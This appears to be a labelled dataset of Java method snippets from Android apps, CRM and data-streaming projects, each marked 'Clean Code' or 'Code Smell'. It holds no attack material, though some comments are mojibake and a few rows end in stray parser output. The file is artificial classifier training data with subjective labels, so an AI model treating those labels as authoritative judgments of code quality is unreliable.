text,label,text_label
"private MainPlayerController(Context context){
  if (context instanceof Activity) {
    mActivity=new WeakReference<>((Activity)context);
  }
  mEventListeners.add(new AutoFrameRateController());
  mEventListeners.add(new PlayerUIController());
  mEventListeners.add(new HQDialogController());
  mEventListeners.add(new VideoStateController());
  mEventListeners.add(new SuggestionsController());
  mEventListeners.add(new VideoLoaderController());
  mEventListeners.add(new RemoteController(context));
  mEventListeners.add(new ContentBlockController());
  mEventListeners.add(new ChatController());
  mEventListeners.add(new CommentsController());
}
",0,Clean Code
"@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusDays(steps));
}
@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusHours(steps));
}
@Override Duration increment(Duration time,int steps){
  return checkBounds(time,time.plusMinutes(steps * TransactionInput.RELATIVE_TIMELOCK_SECONDS_INCREMENT / 60));
}
@Override Duration increment(Duration time,int steps){
  return time.plusSeconds(steps * TransactionInput.RELATIVE_TIMELOCK_SECONDS_INCREMENT);
}
abstract Duration increment(Duration time,int steps);
@Override public void increment(int steps){
  checkMode();
  setValue(mode.get().increment(getValue(),steps));
  mode.get().select(RelativeTimelockSpinner.this);
}",0,Clean Code
"/** 
 * Called to change DetailsOverviewRow view status when current selected row position or selected sub position changed.  Subclass may override.   The default implementation switches between three states based on the positions: {@link FullWidthDetailsOverviewRowPresenter#STATE_HALF}, {@link FullWidthDetailsOverviewRowPresenter#STATE_FULL} and{@link FullWidthDetailsOverviewRowPresenter#STATE_SMALL}.
 * @param presenter   The presenter used to create row ViewHolder.
 * @param viewHolder  The visible (attached) row ViewHolder, note that it may or may notbe selected.
 * @param adapterPosition  The adapter position of viewHolder inside adapter.
 * @param selectedPosition The adapter position of currently selected row.
 * @param selectedSubPosition The sub position within currently selected row.  This is usedWhen a row has multiple alignment positions.
 */
protected void onSetDetailsOverviewRowStatus(FullWidthDetailsOverviewRowPresenter presenter,FullWidthDetailsOverviewRowPresenter.ViewHolder viewHolder,int adapterPosition,int selectedPosition,int selectedSubPosition){
  if (selectedPosition > adapterPosition) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_HALF);
  }
 else   if (selectedPosition == adapterPosition && selectedSubPosition == 1) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_HALF);
  }
 else   if (selectedPosition == adapterPosition && selectedSubPosition == 0) {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_FULL);
  }
 else {
    presenter.setState(viewHolder,FullWidthDetailsOverviewRowPresenter.STATE_SMALL);
  }
}",0,Clean Code
"private void requestLinkPreview(TLRPC.TL_messages_getWebPagePreview req,Utilities.Callback2<Boolean,TLRPC.WebPage> done){
  cancelSearchLinks();
  linkSearchRequestId=getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    linkSearchRequestId=0;
    if (response instanceof TLRPC.TL_messageMediaWebPage) {
      TLRPC.TL_messageMediaWebPage media=(TLRPC.TL_messageMediaWebPage)response;
      if (media.webpage != null && ""telegram_story"".equals(media.webpage.type)) {
        TLRPC.TL_webPageAttributeStory _attrStory=null;
        if (media.webpage.attributes != null) {
          for (int i=0; i < media.webpage.attributes.size(); ++i) {
            if (media.webpage.attributes.get(i) instanceof TLRPC.TL_webPageAttributeStory) {
              _attrStory=(TLRPC.TL_webPageAttributeStory)media.webpage.attributes.get(i);
              break;
            }
          }
        }
        if (_attrStory == null) {
          done.run(false,null);
          return;
        }
        if (_attrStory != null && _attrStory.storyItem != null) {
          done.run(true,media.webpage);
          return;
        }
        final TLRPC.TL_webPageAttributeStory attrStory=_attrStory;
        getMessagesStorage().getStorageQueue().postRunnable(() -> {
          try {
            LongSparseArray<ArrayList<MessageObject>> array=new LongSparseArray<>();
            TLRPC.TL_message message=new TLRPC.TL_message();
            message.message="""";
            message.id=0;
            message.media=media;
            ArrayList<MessageObject> list=new ArrayList<>();
            list.add(new MessageObject(currentAccount,message,false,false));
            array.put(DialogObject.getPeerDialogId(attrStory.peer),list);
            getMessagesController().getStoriesController().getStoriesStorage().fillMessagesWithStories(array,() -> {
              MessageObject result=null;
              if (array.size() == 1 && array.valueAt(0) != null && array.valueAt(0).size() == 1) {
                result=array.valueAt(0).get(0);
              }
              if (result != null && result.messageOwner != null && result.messageOwner.media != null && result.messageOwner.media.webpage != null && result.messageOwner.media.webpage.attributes != null) {
                for (int i=0; i < result.messageOwner.media.webpage.attributes.size(); ++i) {
                  TLRPC.WebPageAttribute attr=result.messageOwner.media.webpage.attributes.get(i);
                  if (attr instanceof TLRPC.TL_webPageAttributeStory) {
                    if (((TLRPC.TL_webPageAttributeStory)attr).storyItem != null) {
                      final TLRPC.WebPage webpage=result.messageOwner.media.webpage;
                      AndroidUtilities.runOnUIThread(() -> {
                        done.run(true,webpage);
                      }
);
                      return;
                    }
                  }
                }
              }
              AndroidUtilities.runOnUIThread(() -> {
                done.run(false,null);
              }
);
            }
,classGuid,false);
          }
 catch (          Exception ignore) {
          }
        }
);
      }
 else {
        done.run(media.webpage != null,media.webpage);
      }
    }
 else {
      done.run(false,null);
    }
  }
));
  getConnectionsManager().bindRequestToGuid(linkSearchRequestId,classGuid);
}",1,Code Smell
"public void recycle(){
  broadcast.unregister();
  if (mListeningKey) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getOnKeyObserver().removeListener(this);
      mListeningKey=false;
    }
  }
  if (mTouchObserver != null) {
    mTouchObserver.stop();
  }
  if (mListeningNotification) {
    mAccessibilityBridge.getNotificationObserver().removeNotificationListener(this);
    mAccessibilityBridge.getNotificationObserver().removeToastListener(this);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2 && NotificationListenerService.Companion.getInstance() != null) {
      NotificationListenerService.Companion.getInstance().removeListener(this);
    }
  }
  if (mKeyInterceptor != null) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getKeyInterrupterObserver().removeKeyInterrupter(mKeyInterceptor);
    }
    mKeyInterceptor=null;
  }
  if (mListeningGesture) {
    AccessibilityService service=mAccessibilityBridge.getService();
    if (service != null) {
      service.getGestureEventDispatcher().removeListener(this);
    }
  }
}",0,Clean Code
"@Override public List<CrmStatisticsPoolSummaryByDateRespVO> getPoolSummaryByDate(CrmStatisticsCustomerReqVO reqVO){
  reqVO.setUserIds(getUserIds(reqVO));
  if (CollUtil.isEmpty(reqVO.getUserIds())) {
    return Collections.emptyList();
  }
  List<CrmStatisticsPoolSummaryByDateRespVO> customerPutCountList=customerMapper.selectPoolCustomerPutCountByDate(reqVO);
  List<CrmStatisticsPoolSummaryByDateRespVO> customerTakeCountList=customerMapper.selectPoolCustomerTakeCountByDate(reqVO);
  List<LocalDateTime[]> timeRanges=LocalDateTimeUtils.getDateRangeList(reqVO.getTimes()[0],reqVO.getTimes()[1],reqVO.getInterval());
  return convertList(timeRanges,times -> {
    Integer customerPutCount=customerPutCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerPutCount).sum();
    Integer customerTakeCount=customerTakeCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerTakeCount).sum();
    return new CrmStatisticsPoolSummaryByDateRespVO().setTime(LocalDateTimeUtils.formatDateRange(times[0],times[1],reqVO.getInterval())).setCustomerPutCount(customerPutCount).setCustomerTakeCount(customerTakeCount);
  }
);
}",0,Clean Code
"/** 
 * 鍒犻櫎鏂囦欢澶逛互鍙婄洰褰曚笅鐨勬枃浠�
 * @param filePath 琚垹闄ょ洰褰曠殑鏂囦欢璺緞
 * @return 鐩綍鍒犻櫎鎴愬姛杩斿洖true锛屽惁鍒欒繑鍥瀎alse
 */
public static boolean deleteDirectory(String filePath){
  boolean flag;
  if (filePath == null || filePath.length() == 0)   return false;
  if (!filePath.endsWith(File.separator)) {
    filePath=filePath + File.separator;
  }
  File dirFile=new File(filePath);
  try {
    if (!dirFile.exists() || !dirFile.isDirectory()) {
      return false;
    }
    flag=true;
    File[] files=dirFile.listFiles();
    for (    File file : files) {
      if (file.isFile()) {
        flag=deleteFile(file.getAbsolutePath());
      }
 else {
        flag=deleteDirectory(file.getAbsolutePath());
      }
      if (!flag)       break;
    }
    if (!flag)     return false;
  }
 catch (  Exception e) {
    return false;
  }
  return dirFile.delete();
}",0,Clean Code
"@Override public boolean onExecute(String verb,String parameter,MissionInit missionInit){
  if (verb == null || verb.length() == 0) {
    return false;
  }
  if (verb.equalsIgnoreCase(ContinuousMovementCommand.MOVE.value())) {
    float targetVelocity=clamp(Float.valueOf(parameter));
    if (targetVelocity != mTargetVelocity) {
      mTargetVelocity=targetVelocity;
      mTicksSinceLastVelocityChange=0;
    }
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.STRAFE.value())) {
    this.overrideMovement.moveStrafe=-clamp(Float.valueOf(parameter));
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.PITCH.value())) {
    this.pitchScale=clamp(Float.valueOf(parameter));
    this.lastAngularUpdateTime=System.currentTimeMillis();
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.TURN.value())) {
    this.yawScale=clamp(Float.valueOf(parameter));
    this.lastAngularUpdateTime=System.currentTimeMillis();
    return true;
  }
 else {
    boolean value=parameter.equalsIgnoreCase(ON_COMMAND_STRING);
    if (verb.equals(ContinuousMovementCommand.JUMP.value())) {
      this.overrideMovement.jump=value;
      return true;
    }
 else     if (verb.equalsIgnoreCase(ContinuousMovementCommand.CROUCH.value())) {
      this.overrideMovement.sneak=value;
      return true;
    }
  }
  return false;
}",0,Clean Code
"public void writeLibrary(Collection<FuncInfo> functions,Map<String,List<String>> enumMap) throws IOException {
  try (BufferedWriter writer=Files.newBufferedWriter(dir.resolve(className + "".java""))){
    writer.append(""package "").append(packageName).append("";\n\n"");
    writer.append(""import com.sun.jna.Callback;\n"");
    writer.append(""import com.sun.jna.Library;\n"");
    writer.append(""import com.sun.jna.Pointer;\n"");
    writer.append(""import com.sun.jna.ptr.PointerByReference;\n"");
    writer.append(""import java.nio.ByteBuffer;\n"");
    writer.append(""import java.nio.FloatBuffer;\n"");
    writer.append(""import java.nio.IntBuffer;\n"");
    writer.append(""import java.nio.LongBuffer;\n"");
    writer.append(""\npublic interface "").append(className).append("" extends Library {\n\n"");
    for (    Map.Entry<String,List<String>> entry : enumMap.entrySet()) {
      String name=entry.getKey();
      writer.append(""\n    enum "").append(name).append("" {\n"");
      List<String> fields=entry.getValue();
      int count=0;
      for (      String field : fields) {
        writer.append(""        "").append(field);
        if (++count < fields.size()) {
          writer.append(',');
        }
        writer.append('\n');
      }
      writer.append(""    }\n"");
    }
    for (    TypeDefine typeDefine : typedefMap.values()) {
      if (typeDefine.isCallBack()) {
        String callbackName=typeDefine.getDataType().getType();
        String returnType=mapping.getProperty(callbackName);
        if (returnType == null) {
          returnType=typeDefine.getValue();
        }
        writer.append(""\n    interface "").append(callbackName);
        writer.append("" extends Callback {\n"");
        writer.append(""        "").append(returnType).append("" apply("");
        writeParameters(writer,callbackName,typeDefine.getParameters());
        writer.append("");\n"");
        writer.append(""    }\n"");
      }
    }
    for (    FuncInfo info : functions) {
      writeFunction(writer,info);
    }
    writer.append(""}\n"");
  }
 }",1,Code Smell
"@Override public void serialize(RowData consumedRow,TypedMessageBuilder<RowData> messageBuilder){
  if (keySerialization == null && !hasMetadata) {
    messageBuilder.value(consumedRow);
    return;
  }
  if (delayMilliseconds > 0) {
    messageBuilder.deliverAfter(delayMilliseconds,TimeUnit.MILLISECONDS);
  }
  if (keySerialization != null) {
    final RowData keyRow=createProjectedRow(consumedRow,RowKind.INSERT,keyFieldGetters);
    messageBuilder.keyBytes(keySerialization.serialize(keyRow));
  }
  final RowKind kind=consumedRow.getRowKind();
  final RowData valueRow=createProjectedRow(consumedRow,kind,valueFieldGetters);
  if (upsertMode) {
    if (kind == RowKind.DELETE || kind == RowKind.UPDATE_BEFORE) {
    }
 else {
      valueRow.setRowKind(RowKind.INSERT);
      messageBuilder.value(valueRow);
    }
  }
 else {
    messageBuilder.value(valueRow);
  }
  Map<String,String> properties=readMetadata(consumedRow,PulsarDynamicTableSink.WritableMetadata.PROPERTIES);
  if (properties != null) {
    messageBuilder.properties(properties);
  }
  final Long eventTime=readMetadata(consumedRow,PulsarDynamicTableSink.WritableMetadata.EVENT_TIME);
  if (eventTime != null && eventTime >= 0) {
    messageBuilder.eventTime(eventTime);
  }
}",1,Code Smell
"private void processLoadedFilterPeersInternal(TLRPC.messages_Dialogs pinnedDialogs,TLRPC.messages_Dialogs pinnedRemoteDialogs,ArrayList<TLRPC.User> users,ArrayList<TLRPC.Chat> chats,ArrayList<MessagesController.DialogFilter> filtersToSave,SparseArray<MessagesController.DialogFilter> filtersToDelete,ArrayList<Integer> filtersOrder,HashMap<Integer,HashSet<Long>> filterDialogRemovals,HashSet<Integer> filtersUnreadCounterReset,Runnable onDone){
  boolean anythingChanged=false;
  putUsersAndChats(users,chats,true,false);
  for (int a=0, N=filtersToDelete.size(); a < N; a++) {
    deleteDialogFilterInternal(filtersToDelete.valueAt(a));
    anythingChanged=true;
  }
  for (  Integer id : filtersUnreadCounterReset) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(id);
    if (filter == null) {
      continue;
    }
    filter.pendingUnreadCount=-1;
  }
  for (  HashMap.Entry<Integer,HashSet<Long>> entry : filterDialogRemovals.entrySet()) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(entry.getKey());
    if (filter == null) {
      continue;
    }
    HashSet<Long> set=entry.getValue();
    for (    Long id : set) {
      filter.pinnedDialogs.delete(id);
    }
    anythingChanged=true;
  }
  for (int a=0, N=filtersToSave.size(); a < N; a++) {
    saveDialogFilterInternal(filtersToSave.get(a),false,true);
    anythingChanged=true;
  }
  boolean orderChanged=false;
  for (int a=0, N=dialogFilters.size(); a < N; a++) {
    MessagesController.DialogFilter filter=dialogFilters.get(a);
    int order=filtersOrder.indexOf(filter.id);
    if (filter.order != order) {
      filter.order=order;
      anythingChanged=true;
      orderChanged=true;
    }
  }
  if (orderChanged) {
    Collections.sort(dialogFilters,(o1,o2) -> {
      if (o1.order > o2.order) {
        return 1;
      }
 else       if (o1.order < o2.order) {
        return -1;
      }
      return 0;
    }
);
    saveDialogFiltersOrderInternal();
  }
  int remote=anythingChanged ? 1 : 2;
  calcUnreadCounters(true);
  getMessagesController().processLoadedDialogFilters(new ArrayList<>(dialogFilters),pinnedDialogs,pinnedRemoteDialogs,users,chats,null,remote,onDone);
}",1,Code Smell
"public static String getProtocolName(int protocol,int version,boolean brief){
  String p=null;
  String b=null;
switch (protocol) {
case 0:
    p=""HOPO"";
  b=""H"";
break;
case 2:
p=""IGMP"";
b=""G"";
break;
case 1:
case 58:
p=""ICMP"";
b=""I"";
break;
case 6:
p=""TCP"";
b=""T"";
break;
case 17:
p=""UDP"";
b=""U"";
break;
case 50:
p=""ESP"";
b=""E"";
break;
}
if (p == null) return Integer.toString(protocol) + ""/"" + version;
return ((brief ? b : p) + (version > 0 ? version : """"));
}",0,Clean Code
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  ModrinthSearchResult modrinthSearchResult=(ModrinthSearchResult)previousPageResult;
  if (modrinthSearchResult != null && modrinthSearchResult.previousOffset >= modrinthSearchResult.totalResultCount) {
    ModrinthSearchResult emptyResult=new ModrinthSearchResult();
    emptyResult.results=new ModItem[0];
    emptyResult.totalResultCount=modrinthSearchResult.totalResultCount;
    emptyResult.previousOffset=modrinthSearchResult.previousOffset;
    return emptyResult;
  }
  HashMap<String,Object> params=new HashMap<>();
  StringBuilder facetString=new StringBuilder();
  facetString.append(""["");
  facetString.append(String.format(""[\""project_type:%s\""]"",searchFilters.isModpack ? ""modpack"" : ""mod""));
  if (searchFilters.mcVersion != null && !searchFilters.mcVersion.isEmpty())   facetString.append(String.format("",[\""versions:%s\""]"",searchFilters.mcVersion));
  facetString.append(""]"");
  params.put(""facets"",facetString.toString());
  params.put(""query"",searchFilters.name);
  params.put(""limit"",50);
  params.put(""index"",""relevance"");
  if (modrinthSearchResult != null)   params.put(""offset"",modrinthSearchResult.previousOffset);
  JsonObject response=mApiHandler.get(""search"",params,JsonObject.class);
  if (response == null)   return null;
  JsonArray responseHits=response.getAsJsonArray(""hits"");
  if (responseHits == null)   return null;
  ModItem[] items=new ModItem[responseHits.size()];
  for (int i=0; i < responseHits.size(); ++i) {
    JsonObject hit=responseHits.get(i).getAsJsonObject();
    items[i]=new ModItem(Constants.SOURCE_MODRINTH,hit.get(""project_type"").getAsString().equals(""modpack""),hit.get(""project_id"").getAsString(),hit.get(""title"").getAsString(),hit.get(""description"").getAsString(),hit.get(""icon_url"").getAsString());
  }
  if (modrinthSearchResult == null)   modrinthSearchResult=new ModrinthSearchResult();
  modrinthSearchResult.previousOffset+=responseHits.size();
  modrinthSearchResult.results=items;
  modrinthSearchResult.totalResultCount=response.get(""total_hits"").getAsInt();
  return modrinthSearchResult;
}",1,Code Smell
"private Pair<List<List<ItemDescriptorWithCount>>,ItemData> combinations(GeyserSession session,RecipeDisplay display,List<SlotDisplay> ingredients){
  Pair<Item,ItemData> pair=translateToOutput(session,display.result());
  if (pair == null || !pair.right().isValid()) {
    return null;
  }
  ItemData output=pair.right();
  if (!(pair.left() instanceof BedrockRequiresTagItem)) {
    output=output.toBuilder().tag(null).build();
  }
  boolean empty=true;
  boolean complexInputs=false;
  List<List<ItemDescriptorWithCount>> inputs=new ArrayList<>(ingredients.size());
  for (  SlotDisplay input : ingredients) {
    List<ItemDescriptorWithCount> translated=translateToInput(session,input);
    if (translated == null) {
      continue;
    }
    inputs.add(translated);
    if (translated.size() != 1 || translated.get(0) != ItemDescriptorWithCount.EMPTY) {
      empty=false;
    }
    complexInputs|=translated.size() > 1;
  }
  if (empty) {
    return null;
  }
  if (complexInputs) {
    long size=1;
    for (    List<ItemDescriptorWithCount> list : inputs) {
      size*=list.size();
      if (size > 500) {
        complexInputs=false;
        break;
      }
    }
    if (complexInputs) {
      return Pair.of(Lists.cartesianProduct(inputs),output);
    }
  }
  int totalSimpleRecipes=inputs.stream().mapToInt(List::size).max().orElse(1);
  inputs=inputs.stream().map(descriptors -> descriptors.stream().sorted(ItemDescriptorWithCountComparator.INSTANCE).collect(Collectors.toList())).collect(Collectors.toList());
  List<List<ItemDescriptorWithCount>> finalRecipes=new ArrayList<>(totalSimpleRecipes);
  for (int i=0; i < totalSimpleRecipes; i++) {
    int current=i;
    finalRecipes.add(inputs.stream().map(descriptors -> {
      if (descriptors.size() > current) {
        return descriptors.get(current);
      }
      return descriptors.get(0);
    }
).toList());
  }
  return Pair.of(finalRecipes,output);
}",1,Code Smell
"@Override public DatasourceDTO get(Long datasourceId) throws DEException {
  DatasourceDTO datasourceDTO=new DatasourceDTO();
  CoreDatasource datasource=datasourceMapper.selectById(datasourceId);
  BeanUtils.copyBean(datasourceDTO,datasource);
  TypeReference<List<ApiDefinition>> listTypeReference=new TypeReference<List<ApiDefinition>>(){
  }
;
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.API.toString())) {
    List<ApiDefinition> apiDefinitionList=JsonUtil.parseList(datasourceDTO.getConfiguration(),listTypeReference);
    List<ApiDefinition> apiDefinitionListWithStatus=new ArrayList<>();
    int success=0;
    for (    ApiDefinition apiDefinition : apiDefinitionList) {
      String status=null;
      if (StringUtils.isNotEmpty(datasourceDTO.getStatus())) {
        JsonNode jsonNode=null;
        try {
          jsonNode=objectMapper.readTree(datasourceDTO.getStatus());
        }
 catch (        Exception e) {
          DEException.throwException(e);
        }
        for (        JsonNode node : jsonNode) {
          if (node.get(""name"").asText().equals(apiDefinition.getName())) {
            status=node.get(""status"").asText();
          }
        }
        apiDefinition.setStatus(status);
      }
      if (StringUtils.isNotEmpty(status) && status.equalsIgnoreCase(""Success"")) {
        success++;
      }
      CoreDatasourceTaskLog log=datasourceTaskServer.lastSyncLogForTable(datasourceId,apiDefinition.getDeTableName());
      if (log != null) {
        apiDefinition.setUpdateTime(log.getStartTime());
      }
      apiDefinitionListWithStatus.add(apiDefinition);
    }
    datasourceDTO.setApiConfigurationStr(new String(Base64.getEncoder().encode(Objects.requireNonNull(JsonUtil.toJSONString(apiDefinitionListWithStatus)).toString().getBytes())));
    if (success == apiDefinitionList.size()) {
      datasourceDTO.setStatus(""Success"");
    }
 else {
      if (success > 0 && success < apiDefinitionList.size()) {
        datasourceDTO.setStatus(""Warning"");
      }
 else {
        datasourceDTO.setStatus(""Error"");
      }
    }
    CoreDatasourceTask coreDatasourceTask=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    TaskDTO taskDTO=new TaskDTO();
    BeanUtils.copyBean(taskDTO,coreDatasourceTask);
    datasourceDTO.setSyncSetting(taskDTO);
    CoreDatasourceTask task=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    if (task != null) {
      datasourceDTO.setLastSyncTime(task.getStartTime());
    }
  }
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.Excel.toString())) {
    datasourceDTO.setFileName(ExcelUtils.getFileName(datasource));
    datasourceDTO.setSize(ExcelUtils.getSize(datasource));
  }
  datasourceDTO.setConfiguration(new String(Base64.getEncoder().encode(datasourceDTO.getConfiguration().getBytes())));
  datasourceDTO.setCreator(coreUserManage.getUserName(Long.valueOf(datasourceDTO.getCreateBy())));
  return datasourceDTO;
}",1,Code Smell
"/** 
 * https://github.com/tommyettinger/BlazingChain
 */
public static String LZ64Decrypt(String str){
  final char[] valStrBase64=new char[]{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,62,0,0,0,63,52,53,54,55,56,57,58,59,60,61,0,0,0,64,0,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,0,0,0,0,0,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51};
  if (str == null) {
    return null;
  }
  if (str.isEmpty()) {
    return """";
  }
  final char[] input=str.toCharArray();
  return LZ64Decrypt(input.length,32,input,valStrBase64,0);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@945e97d",0,Clean Code
"@Override public void onTransitionAnimationEnd(boolean isOpen,boolean backward){
  super.onTransitionAnimationEnd(isOpen,backward);
  if (isOpen && blurredView != null) {
    if (blurredView.getParent() != null) {
      ((ViewGroup)blurredView.getParent()).removeView(blurredView);
    }
    blurredView.setBackground(null);
  }
  notificationsLocker.unlock();
  if (!isOpen) {
    if (opnendForSelect && removeFragmentOnTransitionEnd) {
      removeSelfFromStack();
      if (dialogsActivity != null) {
        dialogsActivity.removeSelfFromStack();
      }
    }
 else     if (finishDialogRightSlidingPreviewOnTransitionEnd) {
      removeSelfFromStack();
      if (parentDialogsActivity != null && parentDialogsActivity.rightSlidingDialogContainer != null) {
        if (parentDialogsActivity.rightSlidingDialogContainer.hasFragment()) {
          parentDialogsActivity.rightSlidingDialogContainer.finishPreview();
        }
      }
    }
  }
}
",0,Clean Code
"private void insertTeslaUser(TeslaServiceUserDO teslaServiceUserDO){
  UserDO userDo=new UserDO();
  userDo.setEmpId(teslaServiceUserDO.getEmployeeId());
  String bucUserId=teslaServiceUserDO.getBucUserId();
  if (!StringUtils.isBlank(bucUserId)) {
    if (bucUserId.endsWith("".0"")) {
      bucUserId=bucUserId.substring(0,bucUserId.indexOf("".""));
    }
    userDo.setBucId(Long.parseLong(bucUserId));
  }
  userDo.setTenantId(Constants.DEFAULT_TENANT_ID);
  userDo.setLoginName(teslaServiceUserDO.getUsername());
  userDo.setNickName(teslaServiceUserDO.getNickname());
  userDo.setEmail(teslaServiceUserDO.getEmail());
  userDo.setPhone(teslaServiceUserDO.getMobilephone());
  userDo.setAliww(teslaServiceUserDO.getAliww());
  userDo.setGmtCreate(new Date());
  userDo.setIsLocked((byte)(userDo.getIsLocked() == 0 ? 1 : 0));
  userDo.setSecretKey(teslaServiceUserDO.getSecretkey());
  userDo.setUserId(UserUtil.getUserId(userDo));
  log.info(""insert user:{}"",userDo);
  userMapper.insert(userDo);
}",0,Clean Code
"private ClusterExemplarProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ClusterExemplarProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5684ccb6",0,Clean Code
"public int getItemCountInternal(){
  if (foundContextBot != null && !inlineMediaEnabled) {
    return 1;
  }
  if (stickers != null) {
    return stickers.size();
  }
 else   if (searchResultBotContext != null) {
    return searchResultBotContext.size() + (searchResultBotContextSwitch != null || searchResultBotWebViewSwitch != null ? 1 : 0);
  }
 else   if (searchResultUsernames != null) {
    return searchResultUsernames.size();
  }
 else   if (searchResultHashtags != null) {
    return searchResultHashtags.size();
  }
 else   if (searchResultCommands != null || quickReplies != null) {
    return (quickReplies == null ? 0 : quickReplies.size()) + (searchResultCommands == null ? 0 : searchResultCommands.size());
  }
 else   if (searchResultSuggestions != null) {
    return searchResultSuggestions.size();
  }
  return 0;
}",0,Clean Code
